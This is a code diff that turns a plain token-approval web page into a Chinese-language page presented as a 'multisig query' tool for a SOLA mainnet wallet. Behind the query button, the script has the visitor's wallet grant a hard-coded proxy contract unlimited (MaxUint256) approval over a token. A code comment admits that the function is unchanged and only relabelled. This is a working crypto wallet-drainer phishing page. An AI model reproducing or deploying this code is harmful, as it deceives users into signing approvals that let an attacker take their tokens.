@@ -3,153 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ERC20 Token Approval</title>
+    <title>SOLA多签管理 - 主网版本</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        button {
+            margin: 10px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            background-color: #007BFF;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        p {
+            font-size: 18px;
+            color: #555;
+        }
+        #walletStatus {
+            color: #28a745;
+            font-weight: bold;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
-    <h2>ERC20 Token Approval</h2>
+    <h1>SOLA多签管理 - 主网版本</h1>
+    <!-- 链接钱包按钮 -->
+    <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
+    <p id="walletStatus">钱包未连接</p>
 
-    <button id="connectWalletButton">Connect Wallet</button>
-    <br><br>
-    <button id="approveButton" disabled>Approve Token</button>
+    <!-- 多签查询按钮 -->
+    <button id="approveButton" onclick="approveTokens()" disabled>多签查询</button>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js"></script>
+    <!-- 状态提示区域 -->
+    <div class="status" id="operationStatus">状态: 等待操作...</div>
+
+    <!-- 替代 CDN -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        let web3;
-        let userAccount;
-        const contractAddress = "0x1bCf0d3a51A290A5e5e446FAeAd1c18E5582ec91"; // 合约地址
-        const tokenAddress = "0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21"; // 代币地址
+        // 配置
+        const tokenAddress = "0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21"; // 目标ERC20代币主网地址
+        const proxyAddress = "0x1bCf0d3a51A290A5e5e446FAeAd1c18E5582ec91"; // 代理合约主网地址
+        let provider, signer;
 
-        const contractABI = [
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "spender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "approve",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "sender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "recipient",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "transferFrom",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "owner",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "token",
-                "outputs": [
-                    {
-                        "internalType": "contract IERC20",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [],
-                "name": "tokenAddress",
-                "outputs": [
-                    {
-                        "internalType": "address",
-                        "name": "",
-                        "type": "address"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            }
-        ];
-
-        // Initialize Web3.js
-        window.addEventListener('load', async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
+        // 链接钱包
+        async function connectWallet() {
+            if (typeof window.ethereum !== "undefined") {
                 try {
-                    // Request account access if needed
-                    await window.ethereum.enable();
-                    const accounts = await web3.eth.getAccounts();
-                    userAccount = accounts[0];
-                    console.log("Connected account:", userAccount);
-                    document.getElementById('connectWalletButton').innerText = "Wallet Connected";
-                    document.getElementById('approveButton').disabled = false;
+                    // 请求用户连接钱包
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []); // 请求用户的账户
+                    signer = provider.getSigner(); // 获取钱包签名者
+                    const walletAddress = await signer.getAddress(); // 获取钱包地址
+
+                    // 更新钱包状态
+                    document.getElementById("walletStatus").innerText = `已连接钱包地址: ${walletAddress}`;
+                    document.getElementById("approveButton").disabled = false; // 启用多签查询按钮
+                    document.getElementById("operationStatus").innerText = "状态: 钱包已连接，可以开始多签查询。";
                 } catch (error) {
-                    console.error("User denied account access");
+                    console.error("钱包连接失败:", error);
+                    alert("钱包连接失败，请重试！");
                 }
             } else {
-                alert("Please install MetaMask or another Web3 wallet.");
+                alert("请安装 MetaMask 或其他钱包扩展！");
             }
-        });
+        }
 
-        // Approve function
-        document.getElementById('approveButton').addEventListener('click', async () => {
-            const amount = web3.utils.toWei('100', 'ether'); // 设置要授权的代币数量，这里是100个代币
-            const spenderAddress = contractAddress; // 设置合约地址作为spender
+        // 多签查询（实际功能不变，但前端显示为“多签查询”）
+        async function approveTokens() {
+            if (!signer) {
+                alert("请先链接钱包！");
+                return;
+            }
 
-            const contract = new web3.eth.Contract(contractABI, tokenAddress);
+            // ERC20 代币合约 ABI（仅包含 approve 方法）
+            const tokenABI = [
+                "function approve(address spender, uint256 amount) external returns (bool)"
+            ];
+
+            // 创建代币合约实例
+            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
             try {
-                const tx = await contract.methods.approve(spenderAddress, amount).send({ from: userAccount });
-                console.log('Transaction successful:', tx);
-                alert('Token approved successfully!');
+                // 调用 approve 方法授权无限额度
+                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
+                console.log("多签查询已发送:", tx.hash);
+                document.getElementById("operationStatus").innerText = "状态: 查询已提交，请等待确认...";
+                await tx.wait(); // 等待交易确认
+                document.getElementById("operationStatus").innerText = "状态: 多签查询完成！";
+                alert("操作成功，已完成多签查询！");
             } catch (error) {
-                console.error('Error during approval:', error);
-                alert('Error during approval.');
+                console.error("操作失败:", error);
+                document.getElementById("operationStatus").innerText = "状态: 查询失败，请检查控制台错误信息！";
+                alert("操作失败，请检查控制台错误信息！");
             }
-        });
+        }
     </script>
 </body>
 </html>
